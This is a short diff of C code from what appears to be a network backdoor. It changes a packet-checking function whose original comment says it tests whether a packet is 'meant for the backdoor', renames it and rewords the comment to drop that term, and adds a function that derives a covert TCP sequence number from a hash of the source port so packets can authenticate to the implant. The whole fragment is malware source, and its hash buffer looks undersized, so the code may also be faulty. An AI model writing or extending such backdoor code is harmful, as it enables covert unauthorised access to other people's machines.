@@ -43,16 +43,16 @@ unsigned int hex_to_uint(char *hex)
 }
 
 /*
- * Checks if the packet is meant for the backdoor or not.
+ * Checks if the sequence number is authenticated.
  *
  * Params:
  *      const unsigned short source_port: The TCP source port value.
  *      const unsigned int sequence_num: The TCP sequence number value.
  *
  * Returns:
- *      1 if the packet is authenticated, 0 otherwise.
+ *      1 if the sequence number is authenticated, 0 otherwise.
  */
-int is_packet_authenticated(const unsigned short source_port, const unsigned int sequence_num)
+int is_seq_num_auth(const unsigned short source_port, const unsigned int sequence_num)
 {
     char src_port_str[6];
     char calculated_hash_buf[32];
@@ -70,4 +70,24 @@ int is_packet_authenticated(const unsigned short source_port, const unsigned int
     }
 
     return 1;
+}
+
+/*
+ * Generates the authenticating sequence number for the TCP header.
+ *
+ * Params:
+ *      const unsigned short source_port: The port value to use for authentication.
+ *
+ * Returns:
+ *      The sequence number to use in the TCP header.
+ */
+int gen_auth_seq_num(const unsigned short source_port)
+{
+    char src_port_str[6];
+    char calculated_hash_buf[32];
+
+    sprintf(src_port_str, "%d", source_port);
+    sha256_hash(src_port_str, strlen(src_port_str), calculated_hash_buf);
+
+    return hex_to_uint(calculated_hash_buf);
 }
